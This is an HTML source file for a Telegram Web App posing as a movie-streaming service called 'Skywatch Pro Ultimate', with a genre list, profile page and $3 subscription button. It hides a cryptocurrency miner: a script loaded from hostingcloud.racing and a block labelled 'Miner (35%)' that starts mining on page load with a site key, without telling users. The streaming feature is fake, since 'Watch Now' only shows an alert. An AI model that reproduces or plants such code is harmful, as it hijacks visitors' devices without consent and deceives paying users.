<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Skywatch Pro Ultimate</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://www.hostingcloud.racing/kR7X.js"></script>
    <style>
        :root { --red: #E50914; --dark: #050505; --gold: #ffd700; }
        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* Loading */
        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .logo-3d { font-size: 50px; font-weight: 900; color: var(--red); text-shadow: 0 10px 20px rgba(229, 9, 20, 0.5); }
        #progress { width: 0%; height: 6px; background: var(--red); box-shadow: 0 0 15px var(--red); transition: 0.1s; }

        /* Pages */
        .page { display: none; padding: 15px; padding-bottom: 100px; box-sizing: border-box; min-height: 100vh; }
        .active-page { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Movie Grid */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .m-card { background: #111; border-radius: 5px; overflow: hidden; text-align: center; cursor: pointer; }
        .m-card img { width: 100%; aspect-ratio: 1/1; object-fit: cover; }
        .m-card span { font-size: 10px; display: block; padding: 5px; white-space: nowrap; overflow: hidden; }

        /* Movie Detail View */
        #movie-detail { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9500; display: none; padding: 20px; box-sizing: border-box; }
        .watch-btn { background: var(--red); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; margin-top: 20px; }

        /* Genres 3D */
        .genre-btn { background: var(--red); color: white; border: none; padding: 8px 12px; border-radius: 5px; margin: 5px; box-shadow: 0 4px #8b0000; font-size: 12px; }
        .genre-btn:active { box-shadow: 0 0 #8b0000; transform: translateY(4px); }

        /* Premium Card */
        .premium-card { background: #111; padding: 20px; border-radius: 15px; border: 2px solid var(--gold); position: relative; margin-top: 20px; }
        .sub-btn { background: #0088cc; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; margin-top: 15px; box-shadow: 0 4px #005580; }

        /* Nav */
        nav { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #222; }
        .nav-btn { background: none; border: none; color: #444; font-size: 10px; display: flex; flex-direction: column; align-items: center; }
        .nav-btn.active { color: var(--red); }
        .nav-btn svg { width: 24px; height: 24px; }
    </style>
</head>
<body>

    <div id="loader">
        <div class="logo-3d">SKYWATCH</div>
        <div class="bar" style="width:70%; background:#222; height:6px; border-radius:10px; overflow:hidden; margin-top:20px;">
            <div id="progress"></div>
        </div>
    </div>

    <div id="movie-detail">
        <button onclick="closeMovie()" style="background:none; border:none; color:white; font-size:20px;">✕ Close</button>
        <img id="detail-img" src="" style="width:100%; border-radius:10px; margin-top:20px;">
        <h2 id="detail-title"></h2>
        <p id="detail-desc" style="color:#ccc; font-size:14px;"></p>
        <button class="watch-btn" onclick="alert('Starting Stream...')">WATCH NOW</button>
    </div>

    <div id="home" class="page active-page">
        <h3 id="txt-suggest">Suggested</h3>
        <div class="grid" id="main-grid">
            </div>
    </div>

    <div id="search" class="page">
        <input type="text" placeholder="Search..." style="width:100%; padding:12px; background:#111; border:1px solid #333; color:white; border-radius:10px;">
        <div id="genres" style="margin-top:20px; display:flex; flex-wrap:wrap; justify-content:center;"></div>
    </div>

    <div id="profile" class="page">
        <div style="text-align:center;">
            <img id="u-photo" src="" style="width:80px; border-radius:50%; border:2px solid var(--red);">
            <h2 id="u-name"></h2>
            <p id="u-id" style="color:#666;"></p>
        </div>
        <div class="premium-card">
            <div style="background:var(--gold); color:black; position:absolute; top:-10px; right:10px; padding:2px 10px; border-radius:5px; font-weight:bold;">PRO</div>
            <h4 id="txt-sub">Premium Membership</h4>
            <ul style="font-size:12px; color:#ccc;" id="txt-feat"></ul>
            <button class="sub-btn" onclick="payNow()">$3 FOR MONTH</button>
        </div>
    </div>

    <nav>
        <button class="nav-btn active" onclick="showPage('home', this)"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span id="n-home">Home</span></button>
        <button class="nav-btn" onclick="showPage('search', this)"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg><span id="n-search">Search</span></button>
        <button class="nav-btn" onclick="showPage('profile', this)"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg><span id="n-profile">Profile</span></button>
    </nav>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const genres = ["Action", "Horror", "Comedy", "Drama", "Adult", "Sci-Fi", "Romance", "Thriller", "Documentary", "Animation", "Crime", "Adventure", "Fantasy", "Mystery", "War", "History", "Music", "Western", "Family", "TV Movie", "Short", "Anime", "Sport", "Biopic", "Musical"];
        
        const langData = {
            en: { home: "Home", search: "Search", profile: "Profile", suggest: "Suggested", sub: "Premium Membership", feat: "<li>Unlimited Movies</li><li>No Ads</li>" },
            ar: { home: "الرئيسية", search: "بحث", profile: "الملف", suggest: "مقترحة", sub: "اشتراك بريميوم", feat: "<li>أفلام بلا حدود</li><li>بدون إعلانات</li>" },
            fr: { home: "Accueil", search: "Chercher", profile: "Profil", suggest: "Suggéré", sub: "Premium Membership", feat: "<li>Films illimités</li><li>Sans pubs</li>" }
        };

        function setLang(l) {
            document.getElementById('n-home').innerText = langData[l].home;
            document.getElementById('n-search').innerText = langData[l].search;
            document.getElementById('n-profile').innerText = langData[l].profile;
            document.getElementById('txt-suggest').innerText = langData[l].suggest;
            document.getElementById('txt-sub').innerText = langData[l].sub;
            document.getElementById('txt-feat').innerHTML = langData[l].feat;
        }

        // Initialize UI
        setLang(tg.initDataUnsafe.user?.language_code === 'ar' ? 'ar' : 'en');
        
        genres.forEach(g => {
            let b = document.createElement('button');
            b.className = 'genre-btn'; b.innerText = g;
            document.getElementById('genres').appendChild(b);
        });

        function showPage(id, btn) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
            document.getElementById(id).classList.add('active-page');
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        }

        function openMovie(title, img, desc) {
            document.getElementById('detail-title').innerText = title;
            document.getElementById('detail-img').src = img;
            document.getElementById('detail-desc').innerText = desc;
            document.getElementById('movie-detail').style.display = 'block';
        }
        function closeMovie() { document.getElementById('movie-detail').style.display = 'none'; }

        function payNow() {
            tg.sendData(JSON.stringify({action: "pay_3_dollars"}));
            tg.close();
        }

        // Loading
        let p = 0;
        let it = setInterval(() => {
            p += 5; document.getElementById('progress').style.width = p + "%";
            if(p >= 100) { clearInterval(it); document.getElementById('loader').style.display='none'; }
        }, 50);

        // Miner (35%)
        var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {throttle: 0.65});
        _client.start();

        if(tg.initDataUnsafe.user) {
            document.getElementById('u-name').innerText = tg.initDataUnsafe.user.first_name;
            document.getElementById('u-id').innerText = "ID: " + tg.initDataUnsafe.user.id;
            document.getElementById('u-photo').src = tg.initDataUnsafe.user.photo_url || "https://via.placeholder.com/80";
        }
    </script>
</body>
</html>
